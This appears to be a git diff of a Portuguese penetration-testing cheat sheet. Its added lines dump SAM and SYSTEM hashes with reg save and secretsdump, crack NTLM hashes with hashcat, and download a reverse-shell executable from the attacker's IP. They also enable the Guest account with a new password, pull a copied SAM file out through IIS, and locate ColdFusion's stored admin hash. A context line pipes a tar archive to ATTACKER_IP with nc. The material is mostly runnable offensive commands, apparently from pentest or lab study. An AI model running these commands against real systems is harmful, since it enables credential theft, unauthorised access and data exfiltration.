@@ -803,10 +803,11 @@ impacket-secretsdump <user>:<pass>@<host>
 
 **Capturing hashes by registry:**
 ```
-reg save hklm\sam <name>
-reg save hklm\system <name>
+reg save hklm\sam C:\sam_copy
+reg save hklm\system C:\system_copy
 impacket-secretsdump -sam <sam> -system <system> LOCAL
 ```
+- `LOCAL` indica que você **não está se conectando a um host remoto**, mas sim extraindo os hashes **localmente**, a partir dos arquivos `SAM` e `SYSTEM` que você possui
 
 **versões de hash no windows (mais antigos pro mais recentes)**
 - LM (geralmente termina com `EE`, se  começar com `AA` e terminar com `EE` está em desuso)
@@ -842,7 +843,7 @@ john --format=nt --wordlist=<wordlist> <hashfile>
 
 **hashcat NT/NTLM**
 
-Para quebrar usando hashcat preciso formatar as hashes do hashdump para o formato adequado
+Para quebrar usando hashcat é preciso formatar as hashes do hashdump para o formato adequado
 
 ```
 # hashes não formatadas
@@ -852,6 +853,10 @@ CPD01:1006:aad3b435b51404eeaad3b435b51404ee:9b6f9e9dd57c57c4f6ff2a5e8c819cdc:::
 DEV01:1007:aad3b435b51404eeaad3b435b51404ee:5288d36e2a539296875b393aa763bfcc:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 USER01:1008:aad3b435b51404eeaad3b435b51404ee:9e40973e2cb458449cb1ce3f4a2a2d6b:::
+
+
+# comando para formatar as hashes rapidamente
+cat hash_desformatadas | cut -d ':' -f3
 
 
 # hash formatadas
@@ -949,6 +954,16 @@ $DCC2$10240#thenrique#bffd65356630d9a479f8e6761f56393d
 ```
 crackmapexec smb HOST -u USER -p PASS -M rdp
 ```
+
+## dir
+pesquisa recursivamente pelo diretorio
+```
+dir <directory_name> /ad /b /s
+```
+- `/ad` → procura apenas diretórios (folders).
+- `/b` → mostra o caminho completo no formato simples (bare format).
+- `/s` → busca recursivamente em todas as subpastas.
+
 
 ## enumeração de usuários do dóminio (AD)
 ```
@@ -1063,6 +1078,8 @@ xfreerdp /v:10.10.39.3 /u:Administrator /p:letmein123!
 # powershell
 transferencia do arquivo rev
 ```
+Invoke-WebRequest -Uri http://<meu_ip>:PORT/rev.exe -OutFile "C:\PATH"
+
 iwr -uri http://<meu_ip>:PORT/rev.exe -outfile rev.exe
 ```
 executar antes
@@ -1200,6 +1217,15 @@ hashcat --example-hashes
 hashcat para identificar a hash
 ```
 hashcat --identify aba63f26d5947a558d4fdbbbe4468965710520540ef3d48e0b3cbf79d6cba217
+```
+
+## previous results
+```
+#1 cracking the hash
+hashcat -m 1000 hash_file /wordlist.txt
+
+#2 showing the results
+hashcat -m 1000 --show hash_file
 ```
 
 ## Hash Format
@@ -1813,6 +1839,8 @@ tar cf - minha_pasta | nc ATTACKER_IP 1234
 - o firewall pode bloquear reverse shell para portas acima de 1024, neste caso é bom tentarmos realizar reverse shell em portas de serviços web (80/443)
 
 ## microsoft iis
+No IIS, por algum motivo, quando eu criei o arquivo `sam_copy` ele não deixou isso visivel no servidor web, apenas quando eu coloquei a extensão .txt, ou seja, por algum motivo só ficou visivel com o nome de arquivo `sam_copy.txt`, eu tentei com extensão que não existia ex: `sam_copy.ablablue` mas n funcionou.
+
 ### asp
 https://medium.com/@far00t01/asp-net-microsoft-iis-pentesting-04571fb071a4
 script to directory and file disclosure:
@@ -2126,6 +2154,11 @@ ffuf -w users.txt:USER -w passwords.txt:PASS -u http://blog.thm/wp-login.php -X 
 proxy burp `-x`
 ```
 -x http://127.0.0.1:8080
+```
+
+filtrar uma resposta `-fr`
+```
+ffuf -u URL/FUZZ -w /wordlists.txt -fr "An Error Occurred"
 ```
 
 header `-H`
@@ -2722,6 +2755,16 @@ executar plink na servidor alvo
 
 ## Privilege escalation
 ### windows
+
+ativa o usuário guest
+```
+# ativa o usuário
+net user Guest /active:yes
+
+# muda a senha do guest
+net user Guest novaSenha
+```
+
 mostra o usuário logado
 ```
 whoami
@@ -2731,6 +2774,7 @@ mostra os grupos do usuario
 whoami /groups
 net user [USER]
 ```
+
 exibe todos os usuários
 ```
 net user
@@ -3040,6 +3084,42 @@ pivoting via proxychains
 
 obs: a conexão via pivoting é mais lenta, evite scanners com muitas portas.
 
+# CMS
+
+## OTRS 
+Links importantes
+- https://github.com/OTRS/otrs.github.io
+- https://academy.otrs.com/doc/
+
+| Diretório/Arquivo | Função                                              |
+| ----------------- | --------------------------------------------------- |
+| `/index.pl`       | Arquivo principal que inicia a aplicação (backend). |
+| `/customer.pl`    | Portal do cliente.                                  |
+| `/js/`            | Arquivos JavaScript.                                |
+| `/css/`           | Arquivos de estilos (CSS).                          |
+| `/img/`           | Imagens usadas na interface.                        |
+
+# framework
+## ColdFusion
+default paths
+
+|Caminho|Descrição|
+|---|---|
+|`/CFIDE/`|**Diretório administrativo padrão.** Contém ferramentas administrativas, scripts, templates e utilitários.|
+|`/CFIDE/administrator/`|**Painel de administração do ColdFusion.** Acesso via web. Se estiver exposto, é crítico.|
+|`/CFIDE/componentutils/`|Ferramentas de depuração e verificação de componentes.|
+|`/CFIDE/scripts/`|Scripts auxiliares utilizados por aplicações ColdFusion.|
+|`/CFIDE/administrator/enter.cfm`|Página de login do administrador ColdFusion.|
+|`/cfdocs/` ou `/CFDOCS/`|Documentação padrão do ColdFusion (se estiver instalada).|
+|`/cfusion/`|Caminho comum na estrutura de arquivos do servidor (nível de sistema, não necessariamente via web).|
+O path `ColdFusion8\lib\password.properties` armazena a hash do admin
+```
+ColdFusion8\lib>type password.properties
+#Thu Mar 05 17:40:39 PST 2020
+rdspassword=
+password=86C16A459ECF39FD76A8E750F9D5074C4722F22B
+encrypted=true
+```
 
 # relatório
 salvar os comandos do terminal e suas respectivas saidas
